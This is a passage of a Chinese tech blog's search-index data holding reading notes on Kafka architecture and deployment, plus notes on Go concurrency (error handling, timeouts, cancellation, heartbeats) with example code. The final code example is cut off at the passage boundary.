2：数据从 Socket Buffer 直接发送到网卡，传输给 Consumer。\n\n\n\n除了零拷贝技术，Kafka 由于大量使用页缓存，故读取消息时大部分消息很有可能依然保存在页缓存中，因此可以直接命中缓存，不用“穿透”到底层的物理磁盘上获取消息，从而极大地提升了消息读取的吞吐量。事实上，如果我们监控一个经过良好调优的 Kafka生产集群便可以发现，即使是那些有负载的 Kafka服务器，其磁盘的读操作也很少，这是因为大部分的消息读取操作会直接命中页缓存。\n消息持久化Kafka是要持久化消息的，而且要把消息持久化到磁盘上。这样做的好处如下。\n\n解耦消息发送与消息消费 ：本质上来说，Kafka 最核心的功能就是提供了生产者-消费者模式的完整解决方案。通过将消息持久化使得生产者方不再需要直接和消费者方耦合，它只是简单地把消息生产出来并交由 Kafka 服务器保存即可，因此提升了整体的吞吐量。\n实现灵活的消息处理 ：很多 Kafka 的下游子系统（接收 Kafka 消息的系统）都有这样的需求——对于已经处理过的消息可能在未来的某个时间点重新处理一次，即所谓的消息重演（message replay）。消息持久化便可以很方便地实现这样的需求。\n\n另外，Kafka 实现持久化的设计也有新颖之处。普通的系统在实现持久化时可能会先尽量使用内存，当内存资源耗尽时，再一次性地把数据“刷盘”；而 Kafka 则反其道而行之，所有数据都会立即被写入文件系统的持久化日志中，之后Kafka服务器才会返回结果给客户端通知它们消息已被成功写入。这样做既实时保存了数据，又减少了 Kafka程序对于内存的消耗，从而将节省出的内存留给页缓存使用，更进一步地提升了整体性能。\n负载均衡和故障转移作为一个功能完备的分布式系统，Kafka 如果只提供了最基本的消息引擎功能肯定不足以帮助它脱颖而出。一套完整的消息引擎解决方案中必然要提供负载均衡（load balancing）和故障转移（fail-over）功能。\n负载均衡就是让系统的负载根据一定的规则均衡地分配在所有参与工作的服务器上，从而最大限度地提升系统整体的运行效率。具体到Kafka来说，默认情况下 Kafka的每台服务器都有均等的机会为 Kafka 的客户提供服务，可以把负载分散到所有集群中的机器上，避免出现“耗尽某台服务器”的情况发生。Kafka 实现负载均衡实际上是通过智能化的分区领导者选举（partition leader election）来实现的。\n故障转移是指当服务器意外中止时，整个集群可以快速地检测到该失效（failure），并立即将该服务器上的应用或服务自动转移到其他服务器上。故障转移通常是以“心跳”或“会话”的机制来实现的，即只要主服务器与备份服务器之间的心跳无法维持或主服务器注册到服务中心的会话超时过期了，那么就认为主服务器已无法正常运行，集群会自动启动某个备份服务器来替代主服务器的工作。Kafka 服务器支持故障转移的方式就是使用会话机制。每台 Kafka 服务器启动后会以会话的形式把自己注册到ZooKeeper 服务器上。一旦该服务器运转出现问题，与ZooKeeper 的会话便不能维持从而超时失效，此时 Kafka 集群会选举出另一台服务器来完全代替这台服务器继续提供服务。\n伸缩性伸缩性，英文名是 scalability。根据 Java 大神 Brian Goetz 在其经典著作 Java Concurrency in Practice 中的定义，伸缩性表示向分布式系统中增加额外的计算资源（比如CPU、内存、存储或带宽）时吞吐量提升的能力。举一个例子来说，对于计算密集型（computation-intensive）的业务而言，CPU的消耗一定是最大的，这类系统上的操作我们称之为 CPU-bound。那么如果一个 CPU 的运算能力是 U，我们自然希望两个 CPU 的运算能力是2U，即可以线性地扩容计算能力，这种线性伸缩性是最理想的状态，但在实际中几乎不可能达到，毕竟分布式系统中有很多隐藏的“单点”瓶颈制约了这种线性的计算能力扩容。\n阻碍线性扩容的一个很常见的因素就是状态的保存。我们知道，不论是哪类分布式系统，集群中的每台服务器一定会维护很多内部状态。如果由服务器自己来保存这些状态信息，则必须要处理一致性的问题。相反，如果服务器是无状态的，状态的保存和管理交于专门的协调服务来做（比如 ZooKeeper），那么整个集群的服务器之间就无须繁重的状态共享，这极大地降低了维护复杂度。倘若要扩容集群节点，只需简单地启动新的节点机器进行自动负载均衡就可以了。\nKafka服务器上的状态统一交由 ZooKeeper保管。但也并不是所有状态都不保存，它只保存了很轻量级的内部状态，因此在整个集群间维护状态一致性的代价是很低的。\nKafka 基本概念和术语Kafka 自推出伊始的确是以消息引擎的身份出现的，其强大的消息传输效率和完备的分布式解决方案，使它很快成为业界翘楚。随着 Kafka 的不断演进，Kafka 开发团队日益发现经Kafka交由下游数据处理平台做的事情Kafka自己也可以做，因此在Kafka 0.10.0.0版本正式推出了Kafka Streams，即流式处理组件。自此Kafka正式成为了一个流式处理框架，而不仅仅是消息引擎了。\n不管是消息引擎还是流式处理平台，它的处理流程并没有发生变化，核心架构也总是类似的，无非是生产一些消息然后再消费一些消息。如果总结起来那就是三句话：\n\n生产者发送消息给Kafka服务器。\n消费者从Kafka服务器读取消息。\nKafka服务器依托ZooKeeper集群进行服务的协调管理。\n\n另外，Kafka 服务器有一个官方名字：broker。\n消息Kafka 中的消息格式由很多字段组成，其中的很多字段都是用于管理消息的元数据字段，对用户来说是完全透明的。Kafka 消息格式共经历过3次变迁，它们被分别称为 V0、V1和 V2版本。目前大部分用户使用的应该还是 V1版本的消息格式。\n\n消息由消息头部、key和value组成。消息头部包括消息的CRC码、消息版本号、属性、时间戳、键长度和消息体长度等信息。\n\nKey：消息键，对消息做partition时使用，即决定消息被保存在某topic下的哪个partition。\nValue：消息体，保存实际的消息数据。\nTimestamp：消息发送时间戳，用于流式处理及其他依赖时间的处理语义。如果不指定则取当前时间。\n\n另外，消息的属性字段，Kafka 为该字段分配了1字节。目前只使用了最低的3位用于保存消息的压缩类型，1位保存时间戳类型，高4位尚未使用。\n\nBit 0-2（3 bits）：压缩类型（Compression Type）\nBit 3（1 bit）：时间戳类型（Timestamp Type）\nBit 4-7（4 bits）：未使用（保留为 0）\n\n\n\n\nAttributes 值\n二进制表示\n时间戳类型\n压缩类型\n\n\n\n0x00 (0)\n0000 0000\nCreateTime\n无压缩\n\n\n0x01 (1)\n0000 0001\nCreateTime\nGzip\n\n\n0x02 (2)\n0000 0010\nCreateTime\nSnappy\n\n\n0x04 (4)\n0000 0100\nCreateTime\nZstd\n\n\n0x08 (8)\n0000 1000\nLogAppendTime\n无压缩\n\n\n0x0A (10)\n0000 1010\nLogAppendTime\nSnappy\n\n\n\nCreateTime（默认）：时间戳由 Producer 设置，适用于**事件时间（Event Time）**语义。\nLogAppendTime：时间戳由 Broker 记录，适用于**写入时间（Processing Time）**语义。\n\nKafka 使用紧凑的二进制字节数组来保存上面这些字段，也就是说没有任何多余的比特位浪费。让我想起了之前看的 Redis 内部用的数据结构，也是十分的紧凑，没有多余比特位的浪费。\ntopic 和 partitiontopic 是一个逻辑概念，代表了一类消息，也可以认为是消息被发送到的地方。通常我们可以使用topic来区分实际业务，比如业务A使用一个topic，业务B使用另外一个topic。Kafka中的 topic通常都会被多个消费者订阅，因此出于性能的考量，Kafka并不是 topic-message 的两级结构，而是采用了 topic-partition-message的三级结构来分散负载。从本质上说，每个Kafka topic都由若干个partition组成。\ntopic是由多个partition组成的，而Kafka的partition是不可修改的有序消息序列，也可以说是有序的消息日志。每个 partition 有自己专属的 partition 号，通常是从0开始的。用户对partition 唯一能做的操作就是在消息序列的尾部追加写入消息。partition 上的每条消息都会被分配一个唯一的序列号——按照Kafka的术语来讲，该序列号被称为位移（offset）。该位移值是从0开始顺序递增的整数。位移信息可以唯一定位到某partition下的一条消息。\n\nKafka 的 partition 实际上并没有太多的业务含义，它的引入就是单纯地为了提升系统的吞吐量，因此在创建 Kafka topic 的时候可以根据集群实际配置设置具体的partition数，实现整体性能的最大化。\noffsettopic partition 下的每条消息都被分配一个位移值。实际上，Kafka 消费者端也有位移（offset）的概念，但这两个offset属于不同的概念\n\n每条消息在某个 partition的位移是固定的，但消费该 partition的消费者的位移会随着消费进度不断前移，但终究不可能超过该分区最新一条消息的位移。Kafka 中的一条消息其实就是一个&lt;topic,partition,offset&gt;三元组（tuple），通过该元组值我们可以在 Kafka 集群中找到唯一对应的那条消息。\nreplica分布式系统要实现高可靠性，就要通过冗余机制来保证。partition 的消息不能只保存一份，而是要保存多份，因此每个 partition 都会分配多个副本（replica），每个副本都保存着该 partition 的消息。\n副本分为两类：领导者副本（leader replica）和追随者副本（follower replica）。follower replica 是不能提供服务给客户端的，也就是说不负责响应客户端发来的消息写入和消息消费请求。它只是被动地向领导者副本（leader replica）获取数据，而一旦 leader replica 所在的broker宕机，Kafka会从剩余的 replica中选举出新的 leader继续提供服务。\nleader 和 followerKafka的 replica分为两个角色：领导者（leader）和追随者（follower）。如今这种角色设定几乎完全取代了过去的主备的提法（Master-Slave）。和传统主备系统（比如MySQL）不同的是，在这类 leader-follower系统中通常只有 leader对外提供服务，follower只是被动地追随 leader 的状态，保持与 leader 的同步。follower 存在的唯一价值就是充当 leader的候补：一旦 leader 挂掉立即就会有一个追随者被选举成为新的 leader 接替它的工作。Kafka保证同一个partition的多个replica一定不会分配在同一台broker上。 毕竟如果同一个broker上有同一个partition的多个replica，那么将无法实现备份冗余的效果。\nISRISR的全称是in-sync replica，翻译过来就是与leader replica保持同步的replica集合。\nKafka为partition动态维护一个replica集合。该集合中的所有replica保存的消息日志都与leader replica保持同步状态。只有这个集合中的 replica才能被选举为 leader，也只有该集合中所有replica都接收到了同一条消息，Kafka才会将该消息置于“已提交”状态，即认为这条消息发送成功。\n正常情况下，partition的所有replica（含leader replica）都应该与leader replica保持同步，即所有 replica都在 ISR中。因为各种各样的原因，一小部分 replica开始落后于 leader replica的进度。当滞后到一定程度时，Kafka会将这些 replica“踢”出 ISR。相反地，当这些 replica重新“追上”了 leader的进度时，那么 Kafka会将它们加回到 ISR中。这一切都是自动维护的，不需要用户进行人工干预。\nKafka 使用场景\n消息传输Kafka非常适合替代传统的消息总线（message bus）或消息代理（message broker）。Kafka特别适合用于实现一个超大量级消息处理应用。\n网站行为日志追踪Kafka 最早就是用于重建用户行为数据追踪系统的。很多网站上的用户操作都会以消息的形式发送到 Kafka 的某个对应的 topic 上。\n审计数据收集对关键的操作和运维进行监控和审计。需要从各个运维应用程序处实时汇总操作步骤信息进行集中式管理。\n日志收集对于大量分散在不同机器上的服务日志。我们可以使用 Kafka对它们进行全量收集，并集中送往下游的分布式存储中（比如 HDFS 等）。\nEvent SourcingEvent Sourcing实际上是领域驱动设计（Domain-Driven Design,DDD）的名词，它使用事件序列来表示状态变更，这种思想和 Kafka 的设计特性不谋而合。Kafka 也是用不可变更的消息序列来抽象化表示业务消息的，因此Kafka特别适合作为这种应用的后端存储。\n流式处理自0.10.0.0版本开始，Kafka社区推出了一个全新的流式处理组件Kafka Streams。\n\n第二章 - Kafka 发展历史挑选我感兴趣的内容，部分略过。\nKafka这个名字的由来。应该是Kafka三位原作者之一Jay Kreps的这句话：\n\nI thought that since Kafka was a system optimized for writing using a writer’s name would make sense.I had taken a lot of lit classes in college and liked Franz Kafka.Plus the name sounded cool for an open source project.因为 Kafka 系统的写操作性能特别强，所以找个作家的名字来命名似乎是一个好主意。我在大学时上了很多文学课，非常喜欢Franz Kafka。另外为开源项目起Kafka这个名字听上去很酷。\n\nKafka三位原作者之一（另外两位分别是Jun Rao和Neha Narkhede）。\n以下是基于搜索结果的Kafka重要版本功能变化汇总表，结合多个来源信息整理而成：\n\n\n\n版本\n功能变化\n说明\n\n\n\n0.8.x\n副本机制\n引入多副本机制（Replication），提升数据可靠性\n\n\n\n新Producer API\n异步发送消息，提升客户端效率，但初期存在稳定性问题\n\n\n\nOffset存储优化\n将消费者位移从ZooKeeper迁移至__consumer_offsets主题，减少ZooKeeper压力\n\n\n0.9.x\n安全认证\n支持SSL&#x2F;SASL认证、授权管理及数据加密，增强外网传输安全性\n\n\n\nKafka Connect\n引入高性能数据集成框架，支持与外部系统（如数据库、HDFS）对接\n\n\n\n新Consumer API\n消费者自主管理Offset，支持多线程消费和细粒度控制，取代旧版High-level Consumer\n\n\n0.10.x\nKafka Streams\n正式成为流处理平台，支持基于时间戳的流计算，但初期功能尚不完善\n\n\n\n消息时间戳\n消息体中增加时间戳字段，支持基于时间的窗口操作和回溯查询\n\n\n0.11.x\nExactly-Once语义\n支持生产者幂等性和事务功能，确保消息不重复处理（需配合Kafka Streams）\n\n\n\n消息格式重构\n优化消息头结构，支持Header字段存储元数据，提升批量消息压缩效率\n\n\n1.0.x\n磁盘故障转移\nBroker单块磁盘损坏时，数据自动迁移至其他磁盘，提升可用性\n\n\n\n跨磁盘副本迁移\n分区副本可在同一Broker的不同磁盘目录间迁移，优化磁盘负载均衡\n\n\n2.0.x\n安全增强\n支持前缀通配符ACL和OAuth2令牌认证，默认启用SSL主机名验证\n\n\n\n消费者组管理优化\n默认Offset保留时间从1天延长至7天，减少消费者组重建时的数据丢失风险\n\n\n2.8.x\nKRaft模式\n引入Raft共识协议替代ZooKeeper管理元数据，简化架构（早期版本不建议生产使用）\n\n\n3.0.x\n移除ZooKeeper依赖\nKRaft模式正式支持，元数据完全由Kafka自身管理，提升云原生兼容性\n\n\n\n默认交付保证增强\n生产者默认启用acks=all和幂等性（enable.idempotence=true），确保消息持久化与顺序性\n\n\n\n版本演进趋势：从消息队列逐步发展为流处理平台，核心改进集中在可靠性（副本、事务）、性能（异步发送、压缩优化）、云原生（KRaft、存储分离）和安全性（SSL、ACL）。\n兼容性注意：\n0.11.x后消息格式变更需客户端同步升级；\n3.0.x起弃用Java 8和Scala 2.12，计划在4.0移除。\n\n\n\n第三章 - Kafka 线上环境部署集群环境规划操作系统优先选择Linux，这里考虑的主要是系统的IO模型、Kafka底层网络库的设计和网络传输效率。\nIO模型主流的有五种：阻塞 I&#x2F;O、非阻塞 I&#x2F;O、I&#x2F;O多路复用、信号驱动 I&#x2F;O和异步 I&#x2F;O。linux epoll取消了轮询机制，取而代之的是回调机制（callback）。这样当底层连接 Socket 数较多时，可以避免很多无意义的 CPU 时间浪费。windows IOCP是异步 I&#x2F;O的实现。\nKafka新版本clients在设计底层网络库时采用了Java的Selector机制。Java的Selector 在 Linux上的实现机制就是 epoll；但是在 Windows平台上，Java NIO的 Selector底层是使用 select模型，在 Java NIO2才是使用 IOCP 实现的。\n网络与磁盘的数据传输 Kafka 通过 Java 的FileChannel.transferTo方法实现。在Linux平台上该方法底层会调用sendfile系统调用，即采用了Linux提供的零拷贝（Zero Copy）技术。对于Windows平台，虽然它也提供了TransmitFile函数来支持零拷贝技术，但是直到Java 8u60版本Windows平台才正式让FileChannel的transferTo方法调用该函数。\n磁盘规划机械硬盘（HDD）和固态硬盘（SSD）对于Kafka没有太大的区别。（当然，SSD会有更好性能，HDD会有更好的性价比）因为Kafka主要是顺序写磁盘，SSD顺序IO不需要频繁移动磁头。\nJBOD（Just Bunch Of Disks 普通磁盘集合） 与磁盘阵列（RAID）。普通磁盘性价比更高。RAID会以容量为代价换来数据的冗余和负载均衡。但是Kafka集群本身可以设置副本数，是自带数据冗余的。使用RAID会增加额外不需要的数据冗余，会是一笔很大的成本开销。\n但JBOD方案也会有缺陷：\n\n任意磁盘损坏都会导致 broker 宕机——普通磁盘损坏的概率是很大的，因此这个缺陷从某种程度上来说是致命的。\nJBOD 的管理需要更加细粒度化。\nJBOD 需要提供类似于负载均衡的功能。\n\n磁盘容量规划Kafka的每条消息都保存在实际的物理磁盘中，这些消息默认会被broker保存一段时间之后清除。这段时间是可以配置的，因此用户可以根据自身实际业务场景和存储需求来大致计算线上环境所需的磁盘容量。\n对于磁盘容量的规划和以下多个因素有关：\n\n新增消息数。\n消息留存时间。\n平均消息大小。\n副本数。\n是否启用压缩。\n\n内存规划Kafka 虽然会持久化每条消息，但其实这个工作都是底层的文件系统来完成的，Kafka 仅仅将消息写入page cache而已，之后将消息“冲刷”到磁盘的任务完全交由操作系统来完成。consumer 在读取消息时也会首先尝试从该区域中查找，如果直接命中则完全不用执行耗时的物理 I&#x2F;O 操作，从而提升了 consumer 的整体性能。\nKafka对于Java堆内存的使用并不多，因为Kafka的消息很快就会被垃圾回收（GC）。一般情况下，broker 所需的堆内存都不会超过6GB。但消息会占用大量系统的 page cache。\n对于内存规划的建议如下。\n\n尽量分配更多的内存给操作系统的page cache。\n不要为broker设置过大的堆内存，最好不超过6GB。\npage cache大小至少要大于一个日志段的大小。\n\nCPU 规划Kafka不属于计算密集型（CPU-bound）的系统，属于IO密集型（I&#x2F;O-bound）的系统。所以多核系统是最佳的选择。\n当然，如果启用了消息压缩，那么 broker 也可能需要大量的 CPU 资源。\n带宽规划对带宽资源规划的建议如下：\n\n尽量使用高速网络。\n根据自身网络条件和带宽来评估Kafka集群机器数量。\n避免使用跨机房网络。\n\n部署这里使用 Docker 部署，关于集群与相关参数设置这里省略，使用的时候根据官方文档设置即可。\ndocker pull apache/kafka:3.9.0docker run -p 9092:9092 apache/kafka:3.9.0\n\n","categories":["读书笔记"],"tags":["《apache Kafka实战》","kafka"]},{"title":"《go语言并发之道》读书笔记-大规模并发","url":"/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E3%80%8Ago%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E4%B9%8B%E9%81%93%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E5%A4%A7%E8%A7%84%E6%A8%A1%E5%B9%B6%E5%8F%91/","content":"前言今天是2025年1月28日，除夕夜晚上十点半。今年家里是十分的冷清，没有什么过年的氛围。不过，可能向来如此吧。\n除夕夜还在看这些，莫名有些伤感。想起一句话：我们是除夕夜街头，即将放飞理想的有志青年。也许吧，还是看书吧\n第五章 - 大规模并发异常传递编写并发代码，特别是在分布式系统中，你的系统中非常容易出现一些奇怪问题，并且难以理解为什么会发生这种情况。为了将你自己、你的团队、你的用户从众多的痛苦中拯救出来，你需要仔细考虑异常(error)是如何通过分布式系统传递的，以及问题最终将如何呈现给使用者。\n异常处理十分的重要，首先来明确异常是什么，什么时候发生，提供了哪些好处。出现异常表示你的系统进入了一个无法满足用户操作的状态，这个操作可能是显式的，也可能是隐式的。这时系统需要传达几个信息：\n\n发生了什么这部分异常信息包含了对异常事件的描述。例如：“磁盘已满”，“连接被重置”，“证书过期”。这些信息可能是被一些代码隐式的表达出来的，你可以用一些上下文来修饰这些信息来帮助用户理解发生了什么问题。\n发生在什么时间、什么位置异常应当总是包含完整的栈轨迹信息，从调用的启动方式开始，以异常的实例结尾。栈轨迹信息不应该包含在异常消息中（这一点尤为重要），但当需要处理栈中的异常时应该很容易被找到。更进一步讲，异常应当包含有关其内部运行的上下文信息。例如，在分布式系统中，异常应该有一些字段用来识别发生异常的机器。发生异常后，这些信息会对你诊断系统故障原因非常有价值。此外，异常还应包含对应机器上的时间，并且最好是UTC时间。\n对用户友好的信息应当对展现给用户的异常信息进行自定义，以适应你的系统和用户。这些信息应该只包含前两点的概述以及相关信息。对用户友好的信息是从用户的角度考虑，给出一些信息，说明这些问题是否是暂时的，并且最好是行以内的文本。\n告诉用户如何获得更多的信息在某些情况下，用户希望知道当异常发生时，具体发生了哪些故障。展现给用户的异常信息应当提供一个ID,利用这个ID可以查询到对应的详细日志。这个详细日志应显示异常的完整信息：发生异常的时间（而不是异常记录的时间)，异常创建时完整的堆栈调用。包含一个堆栈轨迹的hash也有助于聚合这些异常，就像bug追踪器那样跟踪问题。\n\n默认状态下，如果你不介人，异常信息不会包含上述所有的信息。因此，你应当保持这样一种观念，任何展现给用户的异常信息如果没包含这些信息，不是出错了就是有bug。这引出了一个可以用来处理异常的通用模型。所有的异常都几乎都能归为以下两种分类之一：\n\nBug\n已知信息（例如：网络连接断开，磁盘写入失败等）。\n\nBug是一些你未在你的系统中定义的异常，或者一些“原生”的异常，就是那些极少遇到的情况。有时这是有意为之的，在你系统最初的几次迭代中，一些罕见问题展现给用户是可以接受的。还有些时候这是意外发生的。总之，如果你同意我所提出的方法，即“原生”异常总是bug。在确定如何传播异常时，在系统随着时间的推移如何增长以及最终向用户展示什么时，这种区别被证明是非常有用的。\n当我们面向用户部分的代码收到一个格式良好的异常信息时，我们知道在代码的各个层面上，我们都小心的处理了异常，我们可以将其记录下来并打印出来供用户查看。确保异常类型的准确有效是非常重要的。当不规范的异常或bug传递给用户时，我们也应该记录异常，但是应该向用户显示一条友好的消息，指出发生了意外的事情。如果我们在系统中支持自动的异常报告，则应该将这些问题报告为bug。如果我们不这样做，我们应该建议用户提交一个bug反馈。请注意，不规范的异常实际上也可能包含用的信息，但我们不能保证这一点，我们唯一能确认的是异常没有经过我们格式化。因此我们应该直截了当地展示一段人类可解读的信息，来展示刚刚发生的事情。\n请记住，在这两种情况下，如果出现格式不规范的异常，我们将在消息中包含一个日志ID,以便用户在需要更多信息时可以查询到相关的内容。因此，如果bug确实包含了有用的信息，有需要的用户仍然有可追踪的线索。\n作者给了个简单的包装异常的例子，这里就省略了。我通常处理异常的方式和上面是一样的，分为自定义异常（不符合业务逻辑的异常、可以预料到的系统异常）和意料之外的异常。具体处理方式在不同的场景下区别是比较大的，这块后续会去学习errors包的处理方式。另外还有分布式的异常处理方式。\n超时与取消在并发代码运行时，超时（Timeouts）和取消（Cancellation）会频繁出现。超时的处理对于创建一个易于理解的系统是至关重要的，进程被取消是其发生超时时的自然反应。\n那么，为什么希望并发程序支持超时呢？\n\n系统饱和即系统的处理能力达到上线，希望超出的请求返回超时，而不是花很长时间等待响应。\n请求在超时时不太可能重复\n没有资源存储请求（内存队列内存，持久队列磁盘）\n如果系统对响应或请求发送数据有时效性要求。\n如果一个请求可能会重复，超时会额外增加一个请求和超时的消耗。\n如果开销超过系统容量，可能会导致系统宕机。\n\n\n陈旧的数据数据通常有一个窗口期，一般是在这个窗口中必须先处理更多的相关数据，或者处理数据的需求已经过期。如果一个并发进程处理数据需要的时间比这个窗口期更长，我们会想返回超时并取消并发进程。例如，如果我们的并发进程在长时间的等待之后响应请求，则在排队中的请求或其数据可能已经过时。如果事先知道这个窗口时间，那么将context.WithDeadline或context.WithTimeout创建的context.Context传递给我们的并发进程是有意义的。如果事先不知道窗口，我们希望并发进程的父节点能够在请求不再需要时取消并发进程。context.WithCancel是达到这个目的的最佳选择。\n试图防止死锁在大型系统中，尤其是分布式系统中，有时难以理解数据流动的方式，或者可能出现的罕见情况。为了保证系统不会发生死锁，建议在所有并发操作中增加超时处理。超时时间不一定要接近执行并发操作所需的实际时间。不过超时的目的只是为了防止死锁，所以需要它足够短，使死锁的系统在合理的时间内解除阻塞即可。尝试通过设置超时可以将一个死锁系统转变为一个活锁系统。不过，在大型系统中，由于存在更多灵活的组件，在系统死锁后，你的系统更可能会遇到时序配置不同步的情况。因此，最好是在允许的时间内尽可能修复活锁，好过发生死锁后只有通过重新启动才能恢复系统。\n\n如何建立一个并发处理来优雅地处理取消。并发进程可能被取消的原因有很多：\n\n超时超时是隐式取消。\n用户干预为了获得良好的用户体验，通常建议维持一个长链接，然后以轮询间隔将状态报告给用户，或允许用户查看他们认为合适的状态。当用户使用并发程序时，有时需要允许用户取消他们已经开始的操作。\n父进程取消对于这个问题，如果任何一种并发操作的父进程停止，那子进程也将被取消。\n复制请求我们可能希望将数据发送到多个并发进程，以尝试从其中一个进程获得更快的响应。当第一个回来的时候，我们就会取消其余的进程。后面讨论\n\n也可能有有其他原因。\n那么当一个并发进程被取消时，对于正在执行的算法，及其下游消费这意味着什么？在编写可能随时终止的并发代码时，需要考虑哪些事项？\n首先是并发进程的可抢占性。如果一个原子操作执行时间非常地长，那么在确认取消与停止之间需要很长的时间。\n所以需要定义我们的并发进程可抢占的周期，确保运行周期比抢占周期长的功能本身都是可抢占的。一个简单的方法是将你的goroutine代码段分解成小段。就是那些不可抢占的原子操作，确保它们的运行时间小于你认为可以接受的时间。这里还有另外一个潜在的问题：如果我们的goroutine恰好修改了共享状态(例如数据库，文件，内存数据结构)，那当goroutine被取消时会发生什么？你的goroutine会试图将这个中间状态回滚吗？回滚过程需要多长时间？goroutine已经接收到了停止的信号，所以它不应该花太长的时间来回滚它之前的工作，对吧？就如何处理这个问题很难给出通用的建议，因为你的算法的性质很大程度上决定了你应当如何解决这个问题。然而，如果你将对共享状态的修改保特在一个很小的范围内，并且确保这些修改很容易回滚，那么你可以很好的处理取消。如果可能的话，将中间结果存储在内存，然后尽可能快的修改状态。\n另外，还需要关注重复消息的问题。假设有一个管道，它有三个阶段：生成阶段，阶段A和阶段B。生成阶段通过记录上一次channel被读取的时间，来监控阶段A持续的时间。如果当前实例变得不正常，阶段B在处理中时，实例A被取消。新的请求则会产生新的实例A2。但是阶段B会受到重复的消息。有很多种方法可以避免发送重复的消息。最简单的方法（也是我推荐的方法）是让一个父goroutine在子goroutine已经发送完结果之后发送一个取消信号。这需要各阶段之间的双向通信（心跳）。其他方法是：\n\n接收到的第一个或最后一个消息，如果你的算法允许，或者你的并发进程是幂等的，那么你可以简单地在下游进程中允许可能存在的重复消息，并从接收到的第一个消息或最后一个消息中挑选一个处理。\n像父goroutine确认权限，使用双向通信明确请求允许在B的channel上执行写人操作，这比心跳更安全。然而，在实践中很少这样做，因为它比心跳更加复杂，而心跳更普遍且有效。\n\n心跳心跳是并发进程向外界发出信号的一种方式。这个说法来自人体解剖学，在解剖学中心跳反应了观察者的生命体征。\n在设计并发程序时，一定要考虑到超时和取消。如果从一开始就忽略超时和取消，然后在后期尝试加入它们，这有点像在蛋糕烤好后再加鸡蛋。在并发编程中，有几个的原因使心跳变得格外有趣。它允许我们对系统有深入的了解，当系统工作不正常时，它可以对系统进行测试。下面讨论两种不同类型的心跳：\n\n在一段时间间隔内发出的心跳。\n在工作单元开始时发出的心跳\n\n在一段时间间隔上发出的心跳对并发代码很有用，尤其是当它在处于等待状态。因为你不知道新的事件什么时候会被触发，你的goroutine可能会在等待某件事情发生的时候挂起。心跳是告诉监听程序一切安好的一种方式，而静默状态也是预料之中的。下面的代码演示了一个会发出心跳的goroutine:\npackage mainimport (\t&quot;fmt&quot;\t&quot;time&quot;)func main() &#123;\tdoWork := func(done &lt;-chan any, pulseInterval time.Duration) (&lt;-chan any, &lt;-chan time.Time) &#123;\t\theartbeat := make(chan any) // 建立一个发送心跳的 channel\t\tresults := make(chan time.Time)\t\tgo func() &#123;\t\t\tdefer close(heartbeat)\t\t\tdefer close(results)\t\t\tpulse := time.Tick(pulseInterval)       // 设置心跳的间隔时间\t\t\tworkGen := time.Tick(2 * pulseInterval) // 另一个模拟工作结果的生成间隔\t\t\tsendPulse := func() &#123;\t\t\t\tselect &#123;\t\t\t\tcase heartbeat &lt;- struct&#123;&#125;&#123;&#125;:\t\t\t\tdefault: // 添加默认语句，避免阻塞。因为可能没有人接受心跳，从 goroutine 发送信息是重要的，但心跳却不一定重要。\t\t\t\t&#125;\t\t\t&#125;\t\t\tsendResult := func(r time.Time) &#123;\t\t\t\tfor &#123;\t\t\t\t\tselect &#123;\t\t\t\t\tcase &lt;-done:\t\t\t\t\t\treturn\t\t\t\t\tcase &lt;-pulse: // 和 done channel 一样，当执行发送或接收时，也需要发送一个包含心跳的分支\t\t\t\t\t\tsendPulse()\t\t\t\t\tcase results &lt;- r:\t\t\t\t\t\treturn\t\t\t\t\t&#125;\t\t\t\t&#125;\t\t\t&#125;\t\t\tfor &#123;\t\t\t\tselect &#123;\t\t\t\tcase &lt;-done:\t\t\t\t\treturn\t\t\t\tcase &lt;-pulse: // 和 done channel 一样，当执行发送或接收时，也需要发送一个包含心跳的分支\t\t\t\t\tsendPulse()\t\t\t\tcase r := &lt;-workGen:\t\t\t\t\tsendResult(r)\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;()\t\treturn heartbeat, results\t&#125;\tdone := make(chan any)\ttime.AfterFunc(10*time.Second, func() &#123; close(done) &#125;) // 10秒后关闭 done channel\tconst timeout = 2 * time.Second               // 设置超时时间\theartbeat, results := doWork(done, timeout/2) // 心跳间隔为超时时间的一半，以便心跳有额外的响应时间\tfor &#123;\t\tselect &#123;\t\tcase _, ok := &lt;-heartbeat: // 处理心跳。知道心跳会有消息，如果什么都没收到，便知道是 goroutine 出了问题\t\t\tif !ok &#123;\t\t\t\treturn\t\t\t&#125;\t\t\tfmt.Println(&quot;pulse&quot;)\t\tcase r, ok := &lt;-results:\t\t\tif !ok &#123;\t\t\t\treturn\t\t\t&#125;\t\t\tfmt.Printf(&quot;results %v\\n&quot;, r.Second())\t\tcase &lt;-time.After(timeout): // 如果没有收到心跳或其他消息，就会超时\t\t\treturn\t\t&#125;\t&#125;&#125;\n\n输出如下：\npulsepulseresults 18pulsepulseresults 20pulsepulseresults 22pulsepulseresults 24pulseresults 26\n\n下面来模拟一个异常的 goroutine 。它将在两次迭代后停止，但不关闭任何一个 channel：\npackage mainimport (\t&quot;fmt&quot;\t&quot;time&quot;)func main() &#123;\tdoWork := func(done &lt;-chan any, pulseInterval time.Duration) (&lt;-chan any, &lt;-chan time.Time) &#123;\t\theartbeat := make(chan any)\t\tresults := make(chan time.Time)\t\tgo func() &#123;\t\t\tpulse := time.Tick(pulseInterval)\t\t\tworkGen := time.Tick(2 * pulseInterval)\t\t\tsendPulse := func() &#123;\t\t\t\tselect &#123;\t\t\t\tcase heartbeat &lt;- struct&#123;&#125;&#123;&#125;:\t\t\t\tdefault:\t\t\t\t&#125;\t\t\t&#125;\t\t\tsendResult := func(r time.Time) &#123;\t\t\t\tfor &#123;\t\t\t\t\tselect &#123;\t\t\t\t\tcase &lt;-pulse:\t\t\t\t\t\tsendPulse()\t\t\t\t\tcase results &lt;- r:\t\t\t\t\t\treturn\t\t\t\t\t&#125;\t\t\t\t&#125;\t\t\t&#125;\t\t\tfor i := 0; i &lt; 2; i++ &#123;\t\t\t\tselect &#123;\t\t\t\tcase &lt;-done:\t\t\t\t\treturn\t\t\t\tcase &lt;-pulse:\t\t\t\t\tsendPulse()\t\t\t\tcase r := &lt;-workGen:\t\t\t\t\tsendResult(r)\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;()\t\treturn heartbeat, results\t&#125;\tdone := make(chan 